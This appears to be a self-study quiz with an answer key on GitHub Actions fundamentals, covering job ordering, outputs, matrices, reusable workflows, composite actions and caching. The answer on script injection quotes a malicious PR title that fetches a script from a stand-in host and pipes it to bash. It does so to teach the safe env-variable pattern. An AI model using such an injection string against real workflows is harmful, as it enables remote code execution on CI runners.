# Day 61 — Quiz: GitHub Actions Fundamentals

Try to answer without looking at your notes. Answers are at the bottom.

1. Do jobs in a workflow run in the order they appear in the YAML file? If not, how do you enforce order?
2. Do steps within a single job share filesystem state with each other? Do jobs share filesystem state with each other?
3. What's the two-hop mechanism required to expose a value produced in one job's step to a downstream job?
4. Why is `${{ github.event.pull_request.title }}` dangerous to interpolate directly into a `run:` block, and what's the safe alternative?
5. What does `fail-fast: false` change about matrix job behavior, and what's the default?
6. What's the difference between `matrix.include` adding a new combination versus merging into an existing one?
7. What's the structural difference between a reusable workflow (`workflow_call`) and a composite action?
8. Do secrets automatically flow into a called reusable workflow? How do you pass them?
9. Why must every `run:` step inside a composite action declare `shell: bash` (or another shell) explicitly?
10. Why must a cache `key` include `hashFiles('**/package-lock.json')` (or equivalent) instead of a static string?
11. What's the difference between `actions/cache` and Docker layer caching via `docker/build-push-action`'s `cache-from`/`cache-to: type=gha`?
12. **Interview question:** How do you reduce GitHub Actions workflow run time from 20 minutes to 5 minutes?

---

## Answers

1. No — jobs run **in parallel by default**, regardless of the order they're written in the file. To force ordering, a job must declare `needs: [other-job]`.
2. Steps within one job share the same runner filesystem (sequential execution, same VM/container). Jobs do **not** share filesystem state — each job starts on a fresh runner; anything needed across jobs must go through `outputs` or explicit artifact upload/download.
3. A step writes `key=value` into `$GITHUB_OUTPUT`, becoming `steps.<id>.outputs.<key>` within that job. The job must then re-expose it via its own `outputs:` block (`outputs: { name: ${{ steps.<id>.outputs.key }} }`). A downstream job with `needs: <job>` can then read `needs.<job>.outputs.<name>`.
4. PR titles (and similarly branch names, issue bodies, commit messages) are attacker-controlled — GitHub does raw text substitution into the `run:` script before the shell parses it, so a malicious title like `"; curl evil.sh | bash #` becomes executable code. The safe alternative is passing it through `env:` (`env: PR_TITLE: ${{ github.event.pull_request.title }}`) and referencing `$PR_TITLE` in the shell, where it's treated as inert data, not code.
5. Default is `fail-fast: true` — the instant one matrix combination fails, GitHub cancels all other still-running combinations in that matrix. Setting `fail-fast: false` lets every combination run to completion regardless of others' failures, giving a full compatibility report.
6. If an `include` entry's keys match an existing cartesian-product combination, it merges into (and can add/override fields on) that entry. If the keys don't match any existing combination, it's added as a brand-new, extra job run.
7. A reusable workflow can define multiple jobs, each with its own `runs-on`, and has an explicit `inputs`/`secrets`/`outputs` contract declared under `workflow_call`. A composite action is a sequence of steps that run inside the *calling* job, on the calling job's existing runner — it can't define its own jobs or runner.
8. No — secrets do not automatically propagate into a called reusable workflow. You either pass them individually (`secrets: { token: ${{ secrets.X }} }`) or use the shorthand `secrets: inherit` to forward everything the caller has (wider blast radius, less explicit).
9. Because composite actions are meant to be portable/reusable across different consumer contexts where GitHub cannot safely infer a default shell the way it can for an ordinary workflow step — omitting `shell:` causes a "required property is missing" validation error.
10. A static key never changes, so the cache is restored (and treated as valid) even after dependencies have actually changed — silently serving stale packages. Hashing the lockfile means any dependency change produces a new key, forcing a correct rebuild, while unchanged lockfiles keep hitting the same cache.
11. `actions/cache` is a generic key-value blob store for arbitrary paths (node_modules, pip cache, etc.) that you manage explicitly with keys/restore-keys. Docker layer caching via `cache-from`/`cache-to: type=gha` is a purpose-built mechanism inside `docker/build-push-action` that caches individual Docker build layers in GitHub's cache backend — `actions/cache` alone doesn't understand Docker's layer graph and won't meaningfully speed up image builds.
12. Strong answer: "Cache dependencies and Docker layers keyed on the lockfile/Dockerfile hash (usually the single biggest win); parallelize independent jobs like lint/test/build instead of chaining them sequentially in one job; shard a large test suite across a matrix; filter triggers with `paths`/`paths-ignore` so irrelevant changes (docs) don't run the full pipeline; and pin a `container:` with a prebuilt toolchain image instead of reinstalling tools from scratch every run. In practice I'd profile the current run's step timings first to find the actual bottleneck rather than guessing."
